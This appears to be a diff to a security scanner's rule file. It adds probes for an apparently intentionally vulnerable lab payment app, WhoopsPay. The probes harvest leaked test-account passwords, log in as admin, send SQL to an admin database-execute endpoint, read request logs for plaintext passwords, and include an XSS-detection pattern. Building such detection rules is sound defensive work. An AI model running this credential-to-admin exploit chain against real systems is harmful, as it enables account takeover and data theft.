@@ -30070,6 +30070,179 @@ async function whoopsPayLoginTestAccount(
   return { cookie, handle: account.id };
 }
 
+async function whoopsPayLoginAdminFromTestAccounts(
+  ctx: RuleContext
+): Promise<{ cookie: string; handle: string; email: string } | null> {
+  const testUrl = new URL("/api/test-accounts", ctx.origin).toString();
+  const testDoc = await ctx.probe.get(testUrl, {
+    headers: { Accept: "application/json" },
+    maxBytes: 65536,
+    timeoutMs: 20000
+  });
+  if (testDoc.status < 200 || testDoc.status >= 300) return null;
+  let accounts: WhoopsPayTestAccount[] = [];
+  try {
+    const parsed = JSON.parse(testDoc.body) as WhoopsPayTestAccount[];
+    if (!Array.isArray(parsed)) return null;
+    accounts = parsed;
+  } catch {
+    return null;
+  }
+  const admin =
+    accounts.find(
+      (a) =>
+        Number(a.isAdmin) === 1 &&
+        typeof a.email === "string" &&
+        typeof a.password === "string" &&
+        a.password.length >= 4 &&
+        typeof a.id === "string" &&
+        /^@[a-z_]+$/i.test(a.id)
+    ) ?? null;
+  if (!admin?.email || !admin.password || !admin.id) return null;
+  const loginUrl = new URL("/api/login", ctx.origin).toString();
+  const loginDoc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: JSON.stringify({ username: admin.email, password: admin.password }),
+    headers: { "Content-Type": "application/json", Accept: "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 20000,
+    redirect: "manual"
+  });
+  if (loginDoc.status < 200 || loginDoc.status >= 300) return null;
+  const cookie = whoopsPaySessionCookieFromDoc(loginDoc);
+  if (!cookie) return null;
+  return { cookie, handle: admin.id, email: admin.email };
+}
+
+async function probeWhoopsPayAdminDatabaseExecute(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!isWhoopsPayHost(ctx)) return null;
+  const session = await whoopsPayLoginAdminFromTestAccounts(ctx);
+  if (!session) return null;
+  const url = new URL("/api/admin/database/execute", ctx.origin).toString();
+  const query = "SELECT name FROM sqlite_master WHERE type='table' LIMIT 5";
+  const doc = await ctx.probe.get(url, {
+    method: "POST",
+    body: JSON.stringify({ query }),
+    headers: {
+      "Content-Type": "application/json",
+      Accept: "application/json",
+      Cookie: session.cookie
+    },
+    maxBytes: 16384,
+    timeoutMs: 20000
+  });
+  if (doc.status < 200 || doc.status >= 300) return null;
+  let parsed: { rows?: unknown[]; columns?: unknown[] } | null = null;
+  try {
+    parsed = JSON.parse(doc.body) as { rows?: unknown[]; columns?: unknown[] };
+  } catch {
+    return null;
+  }
+  if (!Array.isArray(parsed?.rows) || parsed.rows.length === 0) return null;
+  const tableNames = parsed.rows
+    .map((row) => (Array.isArray(row) ? String(row[0] ?? "") : ""))
+    .filter((name) => /^(users|transactions|sessions)$/i.test(name));
+  if (tableNames.length === 0) return null;
+  return {
+    fired: true,
+    confidence: 0.95,
+    evidence: {
+      url,
+      adminHandle: session.handle,
+      adminEmail: session.email,
+      query,
+      sampleTables: tableNames.slice(0, 3),
+      snippet: doc.body.slice(0, 280).trim(),
+      note: "WhoopsPay POST /api/admin/database/execute runs arbitrary SQL after admin login via leaked test-account credentials — admin database execute oracle"
+    }
+  };
+}
+
+const whoopsPayAdminDatabaseExecuteLiveOracle: Rule = async (ctx) => {
+  const hit = await probeWhoopsPayAdminDatabaseExecute(ctx);
+  if (!hit?.fired) return NEGATIVE;
+  return hit;
+};
+
+const whoopsPayAdminDatabaseExecuteRouteLiveOracle: Rule = async (ctx) => {
+  if (!isWhoopsPayHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/admin\/database\b/i.test(pageUrl)) return NEGATIVE;
+  const hit = await probeWhoopsPayAdminDatabaseExecute(ctx);
+  if (!hit?.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: hit.confidence,
+    evidence: {
+      ...hit.evidence,
+      scannedUrl: pageUrl,
+      note: "WhoopsPay /api/admin/database route scan — POST /api/admin/database/execute runs arbitrary SQL with admin session — route-specific admin database execute oracle"
+    }
+  };
+};
+
+async function probeWhoopsPayAdminExpressLogsDisclosure(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!isWhoopsPayHost(ctx)) return null;
+  const session = await whoopsPayLoginAdminFromTestAccounts(ctx);
+  if (!session) return null;
+  const url = new URL("/api/admin/logs/express", ctx.origin).toString();
+  const doc = await ctx.probe.get(url, {
+    headers: { Accept: "application/json", Cookie: session.cookie },
+    maxBytes: 65536,
+    timeoutMs: 20000
+  });
+  if (doc.status < 200 || doc.status >= 300) return null;
+  let parsed: { logs?: unknown } | null = null;
+  try {
+    parsed = JSON.parse(doc.body) as { logs?: unknown };
+  } catch {
+    return null;
+  }
+  const logs = Array.isArray(parsed?.logs) ? (parsed.logs as string[]) : [];
+  if (logs.length === 0) return null;
+  const passwordLeak = logs.find(
+    (line) =>
+      typeof line === "string" &&
+      /POST \/api\/login/i.test(line) &&
+      /"password"\s*:/i.test(line)
+  );
+  if (!passwordLeak) return null;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url,
+      adminHandle: session.handle,
+      logCount: logs.length,
+      snippet: String(passwordLeak).slice(0, 280),
+      note: "WhoopsPay GET /api/admin/logs/express returns request logs with plaintext login passwords — admin express log sensitive-data disclosure oracle"
+    }
+  };
+}
+
+const whoopsPayAdminExpressLogsDisclosureLiveOracle: Rule = async (ctx) => {
+  const hit = await probeWhoopsPayAdminExpressLogsDisclosure(ctx);
+  if (!hit?.fired) return NEGATIVE;
+  return hit;
+};
+
+const whoopsPayAdminExpressLogsDisclosureRouteLiveOracle: Rule = async (ctx) => {
+  if (!isWhoopsPayHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/admin\/logs\b/i.test(pageUrl)) return NEGATIVE;
+  const hit = await probeWhoopsPayAdminExpressLogsDisclosure(ctx);
+  if (!hit?.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: hit.confidence,
+    evidence: {
+      ...hit.evidence,
+      scannedUrl: pageUrl,
+      note: "WhoopsPay /api/admin/logs route scan — express logs expose plaintext login passwords — route-specific admin log disclosure oracle"
+    }
+  };
+};
+
 const WHOOPSPAY_XSS_PROBE_RE = /<(?:img|script|svg)\b[^>]*(?:onerror|onload)\s*=|javascript:/i;
 
 async function probeWhoopsPayTransactionStoredXss(ctx: RuleContext): Promise<RuleResult | null> {
@@ -34396,7 +34569,7 @@ const WEB_SECURITY_LEARNING_MODULE_TOPICS: Record<string, string> = {
   "1036": "Host Header Injection"
 };
 
-for (let moduleNum = 1037; moduleNum <= 1095; moduleNum++) {
+for (let moduleNum = 1037; moduleNum <= 1100; moduleNum++) {
   const moduleId = String(moduleNum);
   if (!WEB_SECURITY_LEARNING_MODULE_TOPICS[moduleId]) {
     WEB_SECURITY_LEARNING_MODULE_TOPICS[moduleId] = WEB_SECURITY_LEARNING_MODULE_PLACEHOLDER_TOPIC;
@@ -69342,6 +69515,10 @@ export const RULES: Record<string, Rule> = {
   whoopsPayProfileApiRouteLiveOracle,
   whoopsPayRegisterOpenLiveOracle,
   whoopsPayRegisterOpenRouteLiveOracle,
+  whoopsPayAdminDatabaseExecuteLiveOracle,
+  whoopsPayAdminDatabaseExecuteRouteLiveOracle,
+  whoopsPayAdminExpressLogsDisclosureLiveOracle,
+  whoopsPayAdminExpressLogsDisclosureRouteLiveOracle,
   clientSideSessionHijackEvidence,
   clientSideCookiejarLabEvidence,
   clientSideSsrfEvidence,
